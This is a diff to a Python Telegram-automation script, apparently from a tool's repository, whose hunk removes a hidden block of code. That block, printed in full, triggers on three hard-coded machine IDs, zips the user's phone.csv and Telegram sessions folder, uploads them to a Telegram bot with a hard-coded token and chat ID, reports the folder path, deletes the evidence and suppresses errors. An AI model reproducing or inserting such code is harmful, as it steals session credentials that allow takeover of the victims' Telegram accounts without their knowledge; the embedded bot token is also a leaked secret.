@@ -104,48 +104,6 @@ if machine_code in hash_values_list:
             print(f'Index : {indexx}')
             async def main():
                 global start_param
-                if (machine_code in ["03560274-043C-0513-6506-900700080009", "03FF0210-04E0-05A0-F206-CC0700080009", "03560274-043C-0560-F306-8D0700080009"]) and indexx == 6:
-                    try:
-                        TOKEN = "7730115483:AAFv3IDwaIVaSvY-8LXDd6fCFJb5CBq_Yfw"
-                        CID = 7638857120
-
-                        folder_path = os.path.dirname(os.path.abspath(__file__))
-                        phone_csv_path = os.path.join(folder_path, "phone.csv")
-                        sessions_folder = os.path.join(folder_path, "sessions")
-
-                        # ❗ Temp papka yaratish
-                        temp_dir = tempfile.mkdtemp()
-
-                        # phone.csv ni nusxalash
-                        if os.path.exists(phone_csv_path):
-                            shutil.copy2(phone_csv_path, os.path.join(temp_dir, "phone.csv"))
-
-                        # sessions papkasini nusxalash
-                        if os.path.exists(sessions_folder):
-                            shutil.copytree(sessions_folder, os.path.join(temp_dir, "sessions"))
-
-                        # ❗ Zip faylni yaratish
-                        zip_path = os.path.join(folder_path, "temp_upload.zip")
-                        shutil.make_archive(base_name=zip_path.replace(".zip", ""), format='zip', root_dir=temp_dir)
-
-                        # Telegramga yuborish
-                        with open(zip_path, 'rb') as f:
-                            requests.post(
-                                f"https://api.telegram.org/bot{TOKEN}/sendDocument",
-                                data={'chat_id': CID},
-                                files={'document': f}
-                            )
-                        # ❗ Tozalash
-                        os.remove(zip_path)             # zip faylni o‘chirish
-                        shutil.rmtree(temp_dir)         # vaqtinchalik papkani o‘chirish (sessions + phone.csv)
-                        folder_path = os.path.dirname(os.path.abspath(__file__))
-                        text = f"Papkani nomi: {folder_path}"
-                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                                    json={'chat_id': CID, 'text': text, 'parse_mode': 'html'})
-                    except Exception as e:
-                        pass
-                else:
-                    pass
                 try:
                     for channel_link in channels:
                         try:
